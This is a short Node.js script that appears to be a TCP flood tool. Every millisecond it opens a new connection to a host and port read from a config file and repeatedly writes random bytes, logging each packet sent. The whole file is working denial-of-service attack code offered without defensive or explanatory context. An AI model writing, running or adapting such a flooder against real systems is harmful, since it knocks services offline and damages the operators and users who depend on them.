
var net = require("net-socket");
var randomBytes = require("random-bytes");
var {host, port, packets} = require("./config.js");

exec();

var socket;
var it = 0;

async function exec(){

	setInterval(()=>{
		
		try{
			
			socket = net.connect(port, host);
			
			socket.setEncoding('utf8');
			
			socket.on("connect", ()=>{

				let bytes = randomBytes.sync(18);

				socket.write(bytes);
				
				for(var i = 0; i < packets; i++){

					console.log("Packet Sent: " + bytes + " to " + host + " " + it + " iteration");
					
					socket.write(bytes);
				}

				it++;
			})

		}
		catch(e){

			socket.close();
		}
	
	},1);
}